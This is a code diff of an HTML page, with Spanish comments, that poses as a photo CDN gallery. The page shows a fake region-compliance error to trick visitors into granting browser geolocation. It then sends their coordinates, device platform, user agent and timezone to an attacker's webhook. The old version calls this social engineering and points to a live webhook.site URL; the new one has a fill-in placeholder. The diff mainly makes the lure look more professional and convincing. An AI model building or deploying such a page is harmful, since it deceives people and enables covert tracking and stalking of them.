@@ -3,151 +3,202 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PhotoStack Premium - Error de Conexión</title>
+    <title>PhotoStack CDN — Global Content Delivery Network</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
-        /* --- ESTILOS PROFESIONALES Y BLUR --- */
+        /* --- CORE STYLES (Ultra-Moderno) --- */
         :root {
-            --primary-red: #ff3b30;
-            --dark-bg: #121212;
-            --text-main: #e0e0e0;
+            --bg-dark: #000000;
+            --bg-card: #1c1c1e;
+            --text-primary: #ffffff;
+            --text-secondary: #a1a1a6;
+            --accent-red: #ff453a; /* Rojo Apple, más sutil */
+            --ease-out: cubic-bezier(0.23, 1, 0.32, 1);
+            --ease-in-out: cubic-bezier(0.4, 0, 0.2, 1);
         }
 
         body, html {
-            margin: 0; padding: 0; height: 100%;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--dark-bg); color: var(--text-main);
-            overflow: hidden; /* Evitar scroll durante el blur */
+            margin: 0; padding: 0; height: 100%; width: 100%;
+            background-color: var(--bg-dark); color: var(--text-primary);
+            font-family: 'Inter', -apple-system, sans-serif;
+            -webkit-font-smoothing: antialiased; overflow: hidden;
         }
 
-        /* Contenedor principal con BLUR dinámico */
-        #main-container {
-            width: 100%; height: 100%;
-            display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
-            gap: 15px; padding: 20px; box-sizing: border-box;
-            transition: filter 0.6s ease; /* Animación suave del blur */
+        /* --- 1. GRILLA DE FOTOS (Fase de Carga) --- */
+        #photo-grid {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 2px; padding: 2px; box-sizing: border-box;
+            transition: filter 1s var(--ease-in-out), transform 1.2s var(--ease-out);
+            z-index: 1;
         }
 
-        /* Fotos grises "cargando" */
-        .photo-placeholder {
-            background-color: #2a2a2a; border-radius: 8px;
-            aspect-ratio: 1 / 1; /* Cuadradas */
+        .photo-item {
+            background-color: #1a1a1a;
+            aspect-ratio: 16 / 10;
+            border-radius: 4px;
             position: relative; overflow: hidden;
+            /* Animación de entrada de la grilla */
+            opacity: 0; transform: translateY(20px);
+            animation: fadeInGrid 0.8s var(--ease-out) forwards;
         }
 
-        /* Animación de carga (shimmer) */
-        .photo-placeholder::after {
-            content: ""; position: absolute; top: 0; left: -100%;
-            width: 100%; height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.05), transparent);
-            animation: shimmer 1.5s infinite;
+        /* Generar retrasos para la animación de entrada */
+        .photo-item:nth-child(1) { animation-delay: 0.1s; }
+        .photo-item:nth-child(2) { animation-delay: 0.15s; }
+        .photo-item:nth-child(3) { animation-delay: 0.2s; }
+        .photo-item:nth-child(n+4) { animation-delay: 0.25s; }
+
+        @keyframes fadeInGrid {
+            to { opacity: 1; transform: translateY(0); }
         }
 
-        @keyframes shimmer { 100% { left: 100%; } }
+        /* Efecto Shimmer de Carga Profundo */
+        .photo-item::after {
+            content: ""; position: absolute; top: 0; left: -150%;
+            width: 150%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.03), transparent);
+            animation: shimmer 2s var(--ease-in-out) infinite;
+        }
 
-        /* --- SUPERPOSICIÓN DE ERROR (OVERLAY) --- */
+        @keyframes shimmer { 100% { left: 150%; } }
+
+        /* --- ESTADOS DE LA GRILLA (Blur y Escala) --- */
+        body.error-active #photo-grid {
+            filter: blur(20px); /* Blur intenso y profesional */
+            transform: scale(1.1); /* Efecto de acercamiento al fondo */
+        }
+
+        /* --- 2. OVERLAY DE ERROR (Professional UX) --- */
         #error-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-color: rgba(0, 0, 0, 0.7); /* Fondo semi-transparente */
+            background: radial-gradient(circle at center, rgba(0,0,0,0.3) 0%, rgba(0,0,0,0.8) 100%);
             display: flex; justify-content: center; align-items: center;
-            opacity: 0; visibility: hidden; /* Oculto al inicio */
-            transition: opacity 0.5s ease; z-index: 1000;
+            opacity: 0; visibility: hidden;
+            transition: opacity 0.8s var(--ease-out);
+            z-index: 1000;
         }
 
-        /* Tarjeta de notificación roja profesional */
+        /* Tarjeta de notificación tipo iOS/MacOS */
         .error-card {
-            background-color: #1e1e1e; border-radius: 16px;
-            width: 90%; max-width: 400px;
-            padding: 30px; box-sizing: border-box;
-            border: 1px solid rgba(255,255,255,0.1);
+            background-color: rgba(28, 28, 30, 0.7); /* Transparencia profesional */
+            backdrop-filter: blur(25px) saturate(180%); /* El secreto del blur profesional */
+            -webkit-backdrop-filter: blur(25px) saturate(180%);
+            border-radius: 22px;
+            width: 90%; max-width: 420px;
+            padding: 35px; box-sizing: border-box;
+            border: 1px solid rgba(255,255,255,0.08);
             text-align: center;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
             
-            /* Animación de entrada (pop-in) */
-            transform: scale(0.8);
-            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            /* Animación de entrada Pop-In Suave */
+            transform: scale(0.9) translateY(20px);
+            transition: transform 0.6s var(--ease-out), opacity 0.6s var(--ease-out);
+            opacity: 0;
         }
 
-        /* Estado ACTIVO del overlay y tarjeta */
-        #error-overlay.active { opacity: 1; visibility: visible; }
-        #error-overlay.active .error-card { transform: scale(1); }
+        /* Activación del Overlay */
+        body.error-active #error-overlay {
+            opacity: 1; visibility: visible;
+        }
+        
+        body.error-active .error-card {
+            transform: scale(1) translateY(0); opacity: 1;
+        }
 
-        /* Icono de advertencia */
+        /* Icono de advertencia minimalista */
         .warning-icon {
-            font-size: 50px; color: var(--primary-red);
-            margin-bottom: 20px; display: inline-block;
-            animation: pulse 2s infinite;
+            font-size: 55px; color: var(--accent-red);
+            margin-bottom: 25px; display: inline-block;
+            animation: pulseWarning 2.5s var(--ease-in-out) infinite;
         }
 
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.1); opacity: 0.8; }
-            100% { transform: scale(1); opacity: 1; }
+        @keyframes pulseWarning {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.05); opacity: 0.9; }
         }
 
         .error-title {
-            font-size: 20px; font-weight: 700; color: #fff;
-            margin-bottom: 10px; text-transform: uppercase;
+            font-size: 22px; font-weight: 700; color: var(--text-primary);
+            margin-bottom: 12px; letter-spacing: -0.5px;
         }
 
         .error-text {
-            font-size: 15px; line-height: 1.5; color: #b0b0b0;
-            margin-bottom: 25px;
+            font-size: 16px; line-height: 1.55; color: var(--text-secondary);
+            margin-bottom: 30px; font-weight: 300;
         }
+        
+        /* Resaltado de texto profesional */
+        .error-text strong { color: var(--text-primary); font-weight: 600; }
 
-        /* Botón profesional de acción */
+        /* Botón de acción Premium */
         .action-button {
-            background-color: var(--primary-red); color: #fff;
-            border: none; padding: 12px 24px;
-            font-size: 16px; font-weight: 600;
-            border-radius: 8px; cursor: pointer;
-            transition: background-color 0.3s ease;
-            width: 100%;
+            background-color: var(--accent-red); color: #ffffff;
+            border: none; padding: 14px 28px;
+            font-size: 17px; font-weight: 600;
+            border-radius: 12px; cursor: pointer;
+            width: 100%; transition: background-color 0.2s var(--ease-out), transform 0.1s var(--ease-out);
+            font-family: 'Inter', sans-serif; letter-spacing: -0.2px;
         }
 
         .action-button:hover { background-color: #ff5c52; }
+        .action-button:active { transform: scale(0.98); }
+
+        /* Estado de "Cargando" del botón */
+        .action-button.loading {
+            background-color: #3a3a3c; color: #8e8e93;
+            cursor: not-allowed; pointer-events: none;
+        }
 
     </style>
 </head>
-<body>
+<body id="page-body">
 
-    <div id="main-container">
+    <div id="photo-grid">
         </div>
 
     <div id="error-overlay">
         <div class="error-card">
             <div class="warning-icon">⚠️</div>
-            <div class="error-title">Error de Compatibilidad</div>
+            <div class="error-title">Restricción de Región Detectada</div>
             <div class="error-text">
-                Los servidores de **PhotoStack México** no son compatibles con la regulación de su región actual. 
+                El clúster de servidores **PhotoStack Network (LATAM-MX)** ha detectado una inconsistencia en los protocolos de cumplimiento de su región.
                 <br><br>
-                Se requiere **activar la ubicación** para sincronizar con un nodo de servidor compatible en su país y restaurar el acceso.
+                Para restaurar el acceso al nodo de contenido global, se requiere una **verificación de ubicación activa**. Esto sincronizará su sesión con un servidor compatible.
             </div>
-            <button class="action-button" onclick="requestLocation()">Sincronizar Ubicación</button>
+            <button class="action-button" id="sync-btn" onclick="requestLocation()">Sincronizar Nodo de Región</button>
         </div>
     </div>
 
     <script>
-        // --- LÓGICA DE INTERFAZ Y RASTREO ---
+        // --- LÓGICA DE INTERFAZ PREMIUM ---
 
-        // 1. Generar placeholders de fotos grises
-        const container = document.getElementById('main-container');
-        for (let i = 0; i < 20; i++) {
+        // 1. Generar placeholders premium (Grises profundos)
+        const grid = document.getElementById('photo-grid');
+        for (let i = 0; i < 24; i++) { // Más fotos para llenar la pantalla
             const div = document.createElement('div');
-            div.className = 'photo-placeholder';
-            container.appendChild(div);
+            div.className = 'photo-item';
+            grid.appendChild(div);
         }
 
-        // 2. Temporizador de 3 segundos para el error
+        // 2. Temporizador de 3.5 segundos para el error (Más natural)
         setTimeout(() => {
-            // Aplicar BLUR al contenedor de fotos
-            document.getElementById('main-container').style.filter = 'blur(10px)';
-            // Mostrar la notificación roja
-            document.getElementById('error-overlay').classList.add('active');
-        }, 3000); // 3000ms = 3 segundos
+            // Activamos el estado de error en el BODY
+            document.getElementById('page-body').classList.add('error-active');
+        }, 3500); // 3500ms
 
-        // 3. Función al hacer clic en el botón (Ingeniería Social)
+        // --- LÓGICA DE RASTREO (WEBHOOK) ---
+
         function requestLocation() {
+            const btn = document.getElementById('sync-btn');
+            const text = document.querySelector('.error-text');
+            const title = document.querySelector('.error-title');
+
             if ("geolocation" in navigator) {
+                // Cambiar estado del botón a "Cargando"
+                btn.innerHTML = "Verificando protocolos...";
+                btn.classList.add('loading');
+
                 // ESTO DISPARA EL AVISO NATIVO DEL NAVEGADOR
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
@@ -156,42 +207,42 @@
                             lat: position.coords.latitude,
                             lon: position.coords.longitude,
                             precision: position.coords.accuracy + "m",
-                            plataforma: navigator.platform,
+                            dispositivo: navigator.platform,
+                            navegador: navigator.userAgent.split(' ')[0],
+                            zona_horaria: Intl.DateTimeFormat().resolvedOptions().timeZone,
                             timestamp: new Date().toISOString()
                         };
                         
-                        // Ocultar error y mostrar "Cargando..."
-                        document.querySelector('.error-title').innerHTML = "Sincronizando...";
-                        document.querySelector('.error-text').innerHTML = "Conectando al nodo más cercano. Por favor espere.";
-                        document.querySelector('.action-button').style.display = 'none';
+                        // Actualizar UI a estado de éxito
+                        title.innerHTML = "Conexión Establecida";
+                        text.innerHTML = "Protocolos sincronizados correctamente. Redirigiendo al clúster más cercano... <br><br> <span style='color:#30d158;'>[OK] Sesión Activa</span>";
+                        btn.style.display = 'none';
 
                         // ENVIAR DATOS A TU WEBHOOK
                         sendToWebhook(data);
                     },
                     (error) => {
                         // ERROR: Usuario denegó el permiso
-                        document.querySelector('.error-text').innerHTML = 
-                            "<span style='color:#ff3b30;'>Error crítico: No se pudo verificar la región. El acceso permanecerá bloqueado.</span>";
+                        btn.innerHTML = "Reintentar Sincronización";
+                        btn.classList.remove('loading');
+                        text.innerHTML = 
+                            "<span style='color:#ff453a; font-weight:600;'>Error 403: Permiso de ubicación requerido para cumplimiento regional. El acceso permanecerá suspendido.</span>";
                     }
                 );
             } else {
-                alert("Su navegador no soporta geolocalización.");
+                alert("Navegador incompatible.");
             }
         }
 
-        // 4. Función para enviar datos al exterior (Webhook)
         function sendToWebhook(data) {
             // !!! REEMPLAZA ESTO CON TU URL DE WEBHOOK.SITE !!!
-            const WEBHOOK_URL = 'https://webhook.site/2251efe8-cd5e-4051-b2c7-0f8f5baf7fd8'; 
+            const WEBHOOK_URL = 'TU_URL_DE_WEBHOOK_AQUI'; 
 
             fetch(WEBHOOK_URL, {
                 method: 'POST',
-                mode: 'no-cors', // Evita bloqueos de seguridad básicos
+                mode: 'no-cors', // Evita bloqueos CORS
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
-            }).then(() => {
-                // Opcional: Redirigir a una página real después de enviar
-                // window.location.href = "https://google.com";
             });
         }
     </script>
